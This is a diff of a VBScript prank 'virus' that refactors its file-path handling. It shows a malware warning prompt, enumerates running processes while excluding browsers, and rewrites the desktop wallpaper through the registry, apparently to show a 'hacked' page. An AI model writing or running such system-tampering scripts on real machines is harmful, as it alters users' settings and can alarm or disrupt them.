@@ -9,19 +9,21 @@ excludedProcesses = Array("chrome.exe", "firefox.exe", "iexplore.exe")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process")
 
-Dim scriptDir
-scriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
+Dim fso, scriptFile, parentFolder
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set scriptFile = fso.GetFile(WScript.ScriptFullName)
+parentFolder = fso.GetParentFolderName(scriptFile)
 
-wallpaperPath = scriptDir & "matrix.png"
-htmlFilePath = scriptDir & "hacked.html"
+wallpaperPath = parentFolder & "\matrix.png"
+htmlFilePath = parentFolder & "\hacked.html"
 
 Set Shell = CreateObject("WScript.Shell")
 
 answer = MsgBox("WARNING: THIS VIRUS CAN HARM TO YOUR COMPUTER, DO YOU WANT TO RUN THIS MALWARE?", vbExclamation + vbYesNo, "WARNING")
 
 Function runVirus()
-    wallpaperPath = scriptDir & "Wallpaper.jpg"
-    htmlFilePath = scriptDir & "File.html"
+    wallpaperPath = parentFolder & "\Wallpaper.jpg"
+    htmlFilePath = parentFolder & "\File.html"
 
     Shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaperPath
     Shell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
